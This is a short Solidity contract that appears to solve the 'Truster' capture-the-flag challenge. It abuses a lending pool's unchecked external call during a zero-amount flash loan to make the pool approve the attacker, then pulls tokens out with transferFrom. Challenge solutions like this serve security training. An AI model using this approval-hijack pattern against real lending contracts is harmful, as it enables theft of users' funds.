// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

contract Attack{
    function attack(TrusterLenderPool pool, DamnValuableToken token)external{
        pool.flashLoan(0,address(this), address(token),abi.encodeWithSignature("approve(address,uint256)",address(this),1000000));

        token.transferFrom(address(pool),address(this),1000000);
        }

    
    }
